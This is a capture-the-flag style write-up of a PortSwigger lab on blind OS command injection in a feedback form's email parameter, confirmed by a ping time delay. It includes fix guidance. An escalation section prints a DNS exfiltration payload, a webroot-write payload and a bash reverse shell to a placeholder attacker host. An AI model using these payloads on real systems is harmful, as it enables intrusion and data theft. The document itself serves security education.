# Lab 2: Blind OS Command Injection — Time Delays

## Executive Summary

This lab demonstrates exploitation of a blind OS command injection vulnerability where injected commands execute on the server but produce no output in the HTTP response. Unlike Lab 1 where command output was returned directly in the response body, this vulnerability exists in a feedback submission form where the backend silently processes user input in a shell command and returns only an empty JSON object regardless of execution outcome. Systematic parameter-by-parameter testing of the feedback form — name, subject, message, and email — identified the `email` parameter as the injection point: injecting `|whoami` caused a 500 Internal Server Error, signaling that the parameter participates in a shell operation. With direct output unavailable, a time-based confirmation technique was applied by injecting `||ping -c 10 127.0.0.1||` to cause the server to execute ten ICMP pings against localhost, inducing a measurable ~10-second delay in the HTTP response. The response returned after 9,468 milliseconds — confirming blind OS command injection via time-based side channel on the `email` parameter.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | OS Command Injection - Blind |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind OS Command Injection — No Output Channel, Time-Based Confirmation |
| **Risk**               | Critical - Arbitrary OS Command Execution with No Output Reflection |
| **Completion**         | June 2,2026 |

## Objective

Identify a blind OS command injection vulnerability in the feedback submission form by systematically testing each parameter for shell injection behavior. Confirm arbitrary command execution using a time-based delay technique — injecting a `ping` command to induce a measurable response delay — on the vulnerable `email` parameter, demonstrating that blind injection is fully exploitable despite the absence of any output channel.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception, capturing GET requests visible in the Intercept panel
- Burp Repeater for parameter-by-parameter payload testing and response timing measurement

**Target:** `email` parameter in the feedback form POST request — user-supplied value incorporated into a server-side shell command without sanitization; no command output reflected in any HTTP response

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "Blind OS command injection with time delays" with Burp Suite Professional configured and actively intercepting traffic. The Proxy Intercept panel was active and capturing GET requests from the application.

<img width="1920" height="982" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/e56128fc-2971-4187-81c9-083ea685054b" />

*Lab 2 OS Command Injection environment displaying the blind OS command injection with time delays challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and intercepting with GET request visible in the Proxy Intercept panel (left)*

### 2. Application Enumeration — Feedback Form Identified

Browsed the full application with Burp Proxy active, capturing all requests. After testing all available application sections, identified the feedback submission form as the remaining untested attack surface. All requests generated during application enumeration were captured in HTTP history.

<img width="1920" height="982" alt="LAB2_ss2" src="https://github.com/user-attachments/assets/693e5d99-6d79-4b8f-b7d1-d55fb4e8e48d" />

*Burp Proxy capturing all application requests in HTTP history (left) | Feedback submission form located and interacted with in the application (right) — form fields include name, email, subject, and message, all of which are candidates for OS command injection testing*

**Attack Surface Analysis:**

The feedback form accepts four user-controlled fields:
- `name`
- `email`
- `subject`
- `message`

Any of these fields could be incorporated into a server-side shell command — for example, to send a notification email using a system mail utility such as `sendmail` or `mail`. These utilities are commonly invoked via shell commands in legacy applications, and if any field value is interpolated unsanitized into the shell command string, injection is possible. All four parameters must be tested independently.

### 3. Feedback Request Captured and Baseline Established

Submitted the feedback form with benign values to capture the POST request. Forwarded the request to Burp Repeater and sent it unmodified to establish the baseline response.

<img width="1920" height="982" alt="LAB2_ss3" src="https://github.com/user-attachments/assets/20279388-d56e-48b7-aff9-c33e7ab2112e" />

*Feedback form POST request sent in Repeater with unmodified values — 200 OK response returns an empty JSON object `{}`. No content is reflected from the form fields. This confirms the injection is blind — any injected command output will not appear in the HTTP response regardless of what executes on the server*

**Request Captured:**
```http
POST /feedback/submit HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&name=test&email=test@test.com&subject=test&message=test
```

**Response:** 200 OK — `{}`

**Critical Observation:** The response body is an empty JSON object. None of the submitted field values appear anywhere in the response. This confirms the injection scenario is fully blind — there is no output channel. Command execution can only be inferred through side effects: response timing, out-of-band interactions, or observable changes to server state. Time-based confirmation is the appropriate technique.

**Inferred Backend Operation:**
```bash
# Likely server-side command — notification email dispatch
mail -s "$subject" "$email" <<< "From: $name\n$message"
# or
sendmail -t "$email" -f "feedback@site.com" -subject "$subject"
```

If any field value is interpolated into this shell command without quoting or sanitization, injected shell metacharacters will be processed by the shell.

### 4. Parameter Testing — Name, Subject, Message

Began systematic testing of each parameter by appending `|whoami` to the value. Testing proceeded parameter by parameter to isolate which field, if any, is vulnerable.

**Payloads Tested:**
```http
# Name parameter test
name=test|whoami&email=test@test.com&subject=test&message=test

# Subject parameter test
name=test&email=test@test.com&subject=test|whoami&message=test

# Message parameter test
name=test&email=test@test.com&subject=test&message=test|whoami
```

<img width="1920" height="982" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/3df2ea0e-921e-4f62-a52f-47dabbcc9fa0" />

*`|whoami` injected into name, subject, and message parameters in sequence — all return 200 OK with empty `{}` response. No behavioral difference observed. These parameters either are not incorporated into a shell command or their injection does not produce a detectable effect at this layer*

**Response for all three:** 200 OK — `{}`

**Analysis:** No observable change in response content, status code, or timing for name, subject, or message. These parameters do not produce a detectable injection signal with `|whoami`. Moving to the `email` parameter.

### 5. Email Parameter Testing — Anomalous Response Detected

Injected `|whoami` into the `email` parameter value.

**Payload:**
```http
csrf=[TOKEN]&name=test&email=test@test.com|whoami&subject=test&message=test
```

<img width="1920" height="982" alt="LAB2_ss5" src="https://github.com/user-attachments/assets/051ee1a7-6490-41dc-8b48-ef532fcba6e7" />

*`|whoami` appended to the email parameter value — 500 Internal Server Error returned with "could not save" error message. Unlike the other three parameters which returned 200 OK silently, the email parameter produces an error response when a shell metacharacter is injected, indicating it participates in a shell operation and the injected character disrupted the command structure*

**Response:** 500 Internal Server Error — `could not save`

**Analysis:** The `email` parameter is behaving differently from the other three. The 500 error with "could not save" indicates that the injected pipe character broke the shell command incorporating the email value — the command failed rather than executing normally. This is not proof of code execution, but it is strong evidence that:

- The `email` value is passed to a shell command
- The pipe character disrupted the command structure
- The parameter is the injection point

The error response does not confirm that `whoami` executed — the broken command may have failed before reaching the injected portion. Time-based confirmation is required to verify actual code execution.

### 6. Time-Based Blind Injection — Payload Delivery

Constructed a time-based payload using `ping` to induce a measurable delay. The `ping -c 10 127.0.0.1` command sends 10 ICMP echo requests to localhost — on Linux, each ping takes approximately 1 second when targeting localhost with default timing, producing a total delay of approximately 10 seconds.

The payload uses double pipe operators (`||`) on both sides of the `ping` command. The `||` operator executes the right-hand command if the left-hand command fails. This structure ensures the `ping` command executes regardless of whether the preceding command in the shell pipeline succeeds or fails, and the trailing `||` terminates the injection cleanly.

**Attack Payload:**
```http
csrf=[TOKEN]&name=test&email=test@test.com||ping+-c+10+127.0.0.1||&subject=test&message=test
```

**URL Decoded:**
```
email=test@test.com||ping -c 10 127.0.0.1||
```

**Shell Command Constructed Server-Side:**
```bash
# Application constructs something equivalent to:
mail -s "test" "test@test.com||ping -c 10 127.0.0.1||"

# Shell processes the || operators:
# test@test.com  — invalid email address, preceding command fragment fails
# ||             — execute next command if previous failed
# ping -c 10 127.0.0.1  — executes — sends 10 pings to localhost (~10 second delay)
# ||             — trailing operator, terminates cleanly
```


<img width="1920" height="982" alt="LAB2_ss6" src="https://github.com/user-attachments/assets/16eaec67-90b6-47ee-aac4-b42589d416ea" />

*Time-based payload `||ping -c 10 127.0.0.1||` submitted in the email parameter — Repeater response panel enters waiting state immediately after submission, indicating the server-side command is executing and the `ping` delay is holding the HTTP response*

**Observed Behavior:** Response withheld — Repeater waiting state confirmed.

### 7. Delay Confirmed — Blind Injection Verified


<img width="1920" height="982" alt="LAB2_ss7" src="https://github.com/user-attachments/assets/8bb11fbc-132a-404f-a675-a9ed9a4f8b07" />

*Response returned after 9,468 milliseconds — the `ping -c 10 127.0.0.1` command executed on the server, sending 10 ICMP pings to localhost and holding the HTTP response for approximately 10 seconds. Blind OS command injection confirmed via time-based side channel on the email parameter*

**Response Time:** 9,468 milliseconds (~9.5 seconds)

**Response:** 200 OK — `{}`

**Confirmation Analysis:** A response delay of 9,468 milliseconds directly corresponds to the execution of `ping -c 10 127.0.0.1`. Normal feedback submission returns in under 500 milliseconds. A ~10-second delay occurring precisely in response to a ping payload with count 10 is deterministic confirmation — network variance and server load cannot account for a delay of this magnitude and precision. The `ping` command executed on the server, confirming arbitrary OS command execution via the `email` parameter.

### 8. Vulnerability Confirmed — Lab Solved


<img width="1920" height="982" alt="LAB2_ss8" src="https://github.com/user-attachments/assets/11cb9dd7-1825-4d53-bce7-92353fde8eec" />

*Repeater showing the 9,468ms delayed response confirming blind OS command injection on the email parameter (left) | Lab completion confirmation — "Congratulations, you solved the lab!" visible in the browser (right)*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 10.0)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**
- `email` parameter value interpolated directly into a shell command without sanitization or quoting
- Shell metacharacters (`||`) accepted and processed, enabling command chaining
- Arbitrary OS commands execute in the context of the application service account
- No output channel required — time-based confirmation sufficient to establish full exploitation

**Complete Attack Chain:**

```
Feedback Form Identified as Untested Attack Surface
        ↓
All Four Parameters Captured: name, email, subject, message
        ↓
|whoami Injected into name, subject, message → 200 OK (No Signal)
        ↓
|whoami Injected into email → 500 Error "could not save"
        ↓
Email Parameter Identified as Shell Injection Point
        ↓
||ping -c 10 127.0.0.1|| Constructed and Submitted
        ↓
Shell Executes ping — 10 ICMP Pings to Localhost
        ↓
HTTP Response Withheld ~10 Seconds During ping Execution
        ↓
Response at 9,468ms — Blind OS Command Injection Confirmed
```

**Why Blind Injection Is As Dangerous As Reflected Injection:**

The absence of output in the HTTP response does not reduce the severity of OS command injection. Blind injection requires an additional confirmation step but provides identical command execution capability. Once confirmed, any command can be executed through the same channel using out-of-band techniques to retrieve output:

```bash
# Exfiltrate command output via DNS (requires Burp Collaborator)
email=test@test.com||nslookup+$(whoami).collaborator-subdomain.net||

# Write command output to a web-accessible file
email=test@test.com||whoami+>+/var/www/html/output.txt||
# Then retrieve: GET /output.txt

# Establish reverse shell
email=test@test.com||bash+-i+>%26+/dev/tcp/attacker-ip/4444+0>%261||
```

Each of these techniques converts a blind injection into a full interactive shell or data exfiltration channel. The time-based confirmation in this lab establishes the injection; real-world exploitation would immediately follow with one of the above escalation methods.

**Time-Based Confirmation — Why ping Is Reliable:**

`ping -c N 127.0.0.1` is the standard time-based OS command injection confirmation payload because:

- Available on virtually all Linux and Unix systems by default
- Produces a predictable, count-controlled delay (N seconds for N pings to localhost)
- Does not depend on network connectivity to external hosts
- Does not require elevated privileges
- Does not write to disk or produce persistent side effects
- Delay duration scales linearly and predictably with the count argument

The correlation between count (10) and delay (~10 seconds) is precise enough to distinguish from server load or network variance with high confidence.

**Comparison — Reflected vs. Blind OS Command Injection:**

| Attribute | Lab 1 (Reflected) | Lab 2 (Blind) |
|-----------|------------------|---------------|
| Output channel | Response body | None |
| Injection confirmation | Immediate (`whoami` output in response) | Time-based delay |
| Exploitation complexity | Low | Medium |
| Data exfiltration | Direct (output in response) | Out-of-band or file write required |
| Severity | Critical | Critical (identical) |
| Detection difficulty | Higher (output visible in logs) | Lower (no output in response or logs) |

**How a Developer Should Fix This Vulnerability:**

The root cause is user-supplied input reaching a shell interpreter. The fix must eliminate shell interpretation entirely.

**Vulnerable Pattern — Shell Invoked with User Input:**
```python
import subprocess
import os

def send_feedback_email(name, email, subject, message):
    # CRITICALLY UNSAFE — shell=True with user input
    cmd = f"mail -s '{subject}' '{email}' <<< 'From: {name}\n{message}'"
    subprocess.run(cmd, shell=True)
```

**Secure Pattern — No Shell, Parameterized Arguments:**
```python
import subprocess
import re

def send_feedback_email(name, email, subject, message):
    # Step 1 — Validate email format before any processing
    if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email address")

    # Step 2 — Pass arguments as a list — shell is never invoked
    # No shell = no shell metacharacters = no injection surface
    subprocess.run(
        ["mail", "-s", subject, email],
        input=f"From: {name}\n{message}",
        text=True,
        shell=False    # Critical — do not invoke a shell
    )
```

**Even Better — Use a Dedicated Mail Library:**
```python
import smtplib
from email.message import EmailMessage

def send_feedback_email(name, email, subject, message):
    # No shell involved at any layer — pure library call
    msg = EmailMessage()
    msg["From"] = "feedback@site.com"
    msg["To"] = email
    msg["Subject"] = subject
    msg.set_content(f"From: {name}\n\n{message}")

    with smtplib.SMTP("localhost") as smtp:
        smtp.send_message(msg)
```

Using a dedicated email library eliminates the OS command surface entirely. The email is constructed and sent through a protocol library — there is no shell, no subprocess, and no possibility of shell metacharacter injection. This is the most robust fix because it removes the attack surface rather than attempting to sanitize input that reaches it.

**Defense-in-Depth Measures:**

| Control | Effect |
|---------|--------|
| `shell=False` with argument list | Eliminates shell injection — no shell invoked |
| Dedicated mail library (smtplib) | Eliminates OS command surface entirely |
| Email format validation | Rejects malformed input before processing |
| Least privilege process account | Limits blast radius if injection occurs |
| Application-level WAF rule for `\|\|`, `;`, backticks in email fields | Reduces attack surface (not a primary fix) |
| Security logging on subprocess calls | Detection and forensics capability |

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Complete application enumeration before focusing on a single endpoint — the feedback form was reached only after testing all other available sections
- Systematic parameter-by-parameter testing — all four fields tested independently with the same payload before drawing conclusions
- 500 error on `email` parameter treated as diagnostic signal rather than failure — it indicated shell participation even without confirming code execution
- Time-based confirmation selected appropriately for a blind scenario where no output channel exists
- `ping -c 10` as the standard reliable payload for blind OS command injection confirmation

**Critical Security Insights:**

**1. Blind Injection Requires Systematic Parameter Testing:**
In Lab 1, the stock check functionality made the injection point obvious — a numeric `storeId` field in a clearly operational feature. In this lab, four form fields are present and only one is vulnerable. Skipping any parameter in testing risks missing the injection point entirely. Every user-controlled field that reaches any server-side processing is in scope.

**2. A 500 Error on Metacharacter Injection Is a Vulnerability Signal:**
The `email` parameter returning a 500 error when `|` was injected while the other parameters returned 200 silently is a meaningful behavioral difference. A broken shell command produces an error that propagates up to the application as an unhandled exception. This is not just noise — it identifies the parameter as a shell injection candidate and directs subsequent testing.

**3. Time-Based Blind Injection and Time-Based Blind SQL Injection Are the Same Principle:**
The methodology used here is directly analogous to Labs 14 and 15 in the SQL injection series. A controlled, measurable delay caused by an injected command confirms execution through a side channel when no direct output is available. The technique transfers across vulnerability classes: wherever a command or query executes synchronously server-side and holds the HTTP response, timing is an available confirmation channel.

**4. Feedback Forms and Email-Sending Functions Are Overlooked Injection Surfaces:**
Feedback forms, contact forms, and notification features are frequently deprioritized in security assessments because they appear to be low-risk, non-functional features from an application logic perspective. In practice, they commonly invoke system mail utilities via shell commands — `sendmail`, `mail`, `mutt` — making them high-value injection targets. Every form that sends email is a potential OS command injection surface if the email, subject, or message fields reach a shell command.

**5. Blind Injection Is Not Less Severe Than Reflected Injection:**
The CVSS score is identical. The exploitation path is slightly longer but entirely deterministic. A confirmed blind OS command injection is a confirmed full server compromise — the additional step of exfiltrating output via DNS, file write, or reverse shell does not reduce the severity of the finding.

## References

1. PortSwigger Web Security Academy - OS Command Injection
2. PortSwigger Web Security Academy - Blind OS Command Injection
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-78 - Improper Neutralization of Special Elements used in an OS Command
5. OWASP OS Command Injection Defense Cheat Sheet
6. OWASP Testing Guide - Testing for OS Command Injection (OTG-INPVAL-013)
7. Python Documentation - subprocess module, Popen with shell=False

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Executing OS commands on systems without explicit written authorization, inducing deliberate delays against production infrastructure, or any form of unauthorized remote code execution is illegal under applicable laws worldwide.
